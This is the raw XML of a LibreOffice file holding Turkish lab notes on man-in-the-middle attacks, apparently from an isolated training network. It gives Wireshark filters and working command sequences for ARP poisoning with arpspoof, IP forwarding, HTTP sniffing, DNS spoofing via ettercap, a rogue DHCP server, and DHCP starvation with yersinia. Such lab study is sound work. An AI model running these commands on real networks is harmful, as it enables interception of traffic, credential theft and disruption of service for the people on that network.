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paragraph-rsid="001a4133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224b12" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="13pt" fo:font-weight="bold" officeooo:rsid="001a4133" officeooo:paragraph-rsid="001a4133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style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="002cff6a" style:font-size-asian="8.75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Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0031c13c" officeooo:paragraph-rsid="0031c13c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Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0033892c" officeooo:paragraph-rsid="0033892c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Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="00356991" officeooo:paragraph-rsid="00356991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Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0036e19b" officeooo:paragraph-rsid="0036e19b" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0031c08a" officeooo:paragraph-rsid="0031c08a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loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0031c13c" officeooo:paragraph-rsid="0031c13c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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0033892c" officeooo:paragraph-rsid="0033892c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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="00356991" officeooo:paragraph-rsid="00356991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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0031c08a" officeooo:paragraph-rsid="0031c08a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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="11pt" fo:font-weight="bold" officeooo:rsid="002cff6a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loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0036e19b" officeooo:paragraph-rsid="0036e19b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Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0039f8c1" officeooo:paragraph-rsid="0039f8c1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000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="003be935" officeooo:paragraph-rsid="003be935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000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="0031c13c" officeooo:paragraph-rsid="0031c13c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000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="003ce993" officeooo:paragraph-rsid="003ce993" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10pt" fo:font-weight="bold" officeooo:rsid="003e2ef7" officeooo:paragraph-rsid="003e2ef7" style:font-size-asian="8.75pt" style:font-weight-asian="bold" style:font-size-complex="10pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003be935" officeooo:paragraph-rsid="003be935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c9211e" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003ce993" officeooo:paragraph-rsid="003ce993" style:font-size-asian="12pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0031c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6.</text:span> <text:span text:style-name="T1">MAN IN THE MİDDLE SALDIRILARI</text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P8">Wireshark Kullanımı ve Paket Filtreleme</text:p>
      <text:p text:style-name="P3">tshark -i eth0 -f "host 1.1.1.1"</text:p>
      <text:p text:style-name="P3">nslookup google.com</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P13">WIRESHARK FİLTRELEME KOMUTLARI:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">ip.addr==10.10.10.11</text:p>
      <text:p text:style-name="P3">ip.dst==10.10.10.11</text:p>
      <text:p text:style-name="P3">ip.src==10.10.10.11</text:p>
      <text:p text:style-name="P3">ip.addr==10.10.10.11 and ip.addr==10.10.10.12</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">IP Adresi Dışlamasıyla:</text:p>
      <text:p text:style-name="P3">!(ip.addr==10.10.10.12)</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">tcp.port==80</text:p>
      <text:p text:style-name="P3">tcp.dstport==80</text:p>
      <text:p text:style-name="P3">ip.addr==10.10.10.11 and tcp.port==80</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Hostname'e Göre:</text:p>
      <text:p text:style-name="P3">ip.host==server05</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">eth.addr==00:70:f4:23:18:c4</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Broadcast Paketlerini Filtreleme:</text:p>
      <text:p text:style-name="P3">eth.dst==ff:ff:ff:ff:ff:ff</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">http.host=="www.google.com"</text:p>
      <text:p text:style-name="P3">http.host contains "google"</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">http.request.method==GET </text:p>
      <text:p text:style-name="P3">http.request.method==POST</text:p>
      <text:p text:style-name="P3">http.request.method==GET or http.request.method==POST</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">ip.addr==10.10.10.11 and http.request.method==GET or http.request.method==POST</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">ip.addr==10.10.10.11 and icmp</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P12">Promiscuous Mode ve Packet Sniff Kavramları</text:p>
      <text:p text:style-name="P4">Promiscuous Mode, hem ilgiliye hem herkese paket gönderir.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P9">ARP Hakkında Ön Bilgilendirme</text:p>
      <text:p text:style-name="P4">arp</text:p>
      <text:p text:style-name="P4">arp -a <text:s text:c="2"/>(local gösterir)</text:p>
      <text:p text:style-name="P4">cat /proc/sys/net/ipv4/neigh/default/gc_stale_time <text:s/>(refresh süresini öğrendik)</text:p>
      <text:p text:style-name="P4">ip n</text:p>
      <text:p text:style-name="P4">arp-scan -l <text:s text:c="2"/>(kapsamlı)</text:p>
      <text:p text:style-name="P4">ifconfig eth0 -arp <text:s/>(arpı çıkardık)</text:p>
      <text:p text:style-name="P4">ifconfig eth0 arp <text:s text:c="2"/>(arpı dahil ettik)</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:soft-page-break/>ARP Poisining Saldırısı</text:p>
      <text:p text:style-name="P4">Amacımız hedef ip nin mac(fiziksel) adresini bizmiş gibi göstermek.</text:p>
      <text:p text:style-name="P5">10.10.10.11 i zehirleyip 10.10.10.12 bizmişiz gibi gösterdik.</text:p>
      <text:p text:style-name="P4">arpspoof -i eth0 10.10.10.12 <text:s text:c="2"/>(buradan herkese yayın yapıyoruz)</text:p>
      <text:p text:style-name="P4">hedeften ping 10.10.10.12 -t <text:s text:c="2"/>yazıp iletişim kurduk.</text:p>
      <text:p text:style-name="P4">arp -a hedeften kontrol ettik. ama mac adr. Aynı</text:p>
      <text:p text:style-name="P4">şimdi hedefin yerine geçeceğiz.</text:p>
      <text:p text:style-name="P4">arpspoof -i eth0 -t 10.10.10.11 10.10.10.254</text:p>
      <text:p text:style-name="P4">arp -a hedeften kontrol ettik. Mac adresi hedef ve host ip için aynı..</text:p>
      <text:p text:style-name="P4">bu işlemleri yaparken wiresharktan hepsini kayda aldık.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P10">IP Forwarding</text:p>
      <text:p text:style-name="P6">echo 1 &gt; /proc/sys/net/ipv4/ip_forward <text:s/>(ip forward ı açtık)</text:p>
      <text:p text:style-name="P6">11 ve 12 iletişim kurarken, 11 sorduğunda 12 için ve 12 sorduğunda da 11 için mac adresi bizim olmalı.</text:p>
      <text:p text:style-name="P6">arpspoof -i eth0 -t 10.10.10.11 10.10.10.12 <text:s text:c="2"/>(tek yönlü yapacak olsaydık bunu)</text:p>
      <text:p text:style-name="P6">arpspoof -i eth0 -t 10.10.10.11 -r 10.10.10.12 <text:s text:c="2"/></text:p>
      <text:p text:style-name="P6">(reverse yaptığımız için 11 ve 12 aralarında konuşurken mac adresi bizim oldu.)</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P11">HTTP Packet Sniffing</text:p>
      <text:p text:style-name="P7">1-Etrafı keşfet.</text:p>
      <text:p text:style-name="P7">2-Sniffer’ı hazırla. (Wireshark)</text:p>
      <text:p text:style-name="P7">3-IP Forward aç.</text:p>
      <text:p text:style-name="P7">4-MITM ol. (ARP’ları çift yönlü zehirle -r)</text:p>
      <text:p text:style-name="P7">5-Sniff et.</text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">arp-scan -l</text:p>
      <text:p text:style-name="P15">wireshark açtık.</text:p>
      <text:p text:style-name="P15">echo 1 &gt; /proc/sys/net/ipvt/ip_forward</text:p>
      <text:p text:style-name="P15">arpspoof -i eth0 -t 10.10.10.11 -r 10.10.10.1</text:p>
      <text:p text:style-name="P15">wireshark üzerinde</text:p>
      <text:p text:style-name="P15">ip.src==10.10.10.11 and ip.dst==10.10.10.1 and http </text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P20">DNS Spoofing</text:p>
      <text:p text:style-name="P16">wireshark ı açtık</text:p>
      <text:p text:style-name="P16">ettercap te önce hostları bulduk sonra 11 ve 254 ü hedef olarak belirledik</text:p>
      <text:p text:style-name="P16">arp poisoning ve dns_sniff plugin i yaptık.</text:p>
      <text:p text:style-name="P16">nano /etc/ettercap/etter.dns <text:s/>(buradan, www.google.com ve www.test.com a giden A adreslerini ayarladık)</text:p>
      <text:p text:style-name="P16">en son apache2 yi çalıştırarak kendimize yönlendirdik</text:p>
      <text:p text:style-name="P4">service apache2 start</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P21">DHCP Spoofing (Rouge Server) Saldırısı</text:p>
      <text:p text:style-name="P18">ettercap te DHCP Spoofing i açtık.</text:p>
      <text:p text:style-name="P18">IP pool una rastgele kullanılmayan ip aralığı verdik.</text:p>
      <text:p text:style-name="P18">Netmask ımız 255.255.255.0</text:p>
      <text:p text:style-name="P18">DNS IP ye ise kendimizi yazıp DNS gibi gösteriyoruz 10.10.10.80</text:p>
      <text:p text:style-name="P18">Hedefin DHCP sini biz sağlamış oluyoruz..</text:p>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P18"/>
      <text:p text:style-name="P21">DHCP Starvation Saldırısı</text:p>
      <text:p text:style-name="P19">DHCP ye devamlı paket göndererek bozmayı amaçlıyoruz.</text:p>
      <text:p text:style-name="P19">yersinia -G <text:s text:c="2"/>den graphic modunu açıyoruz.</text:p>
      <text:p text:style-name="P19">Launch Attack dan DHCP attack yapıyoruz.</text:p>
      <text:p text:style-name="P19"><text:soft-page-break/></text:p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3T04:51:06.373474007</dc:date>
    <meta:editing-duration>PT6H16M13S</meta:editing-duration>
    <meta:editing-cycles>26</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.0.3$Linux_X86_64 LibreOffice_project/40$Build-3</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="3" meta:paragraph-count="81" meta:word-count="386" meta:character-count="3041" meta:non-whitespace-character-count="2713"/>
  </office:meta>
</office:document-meta>
</file>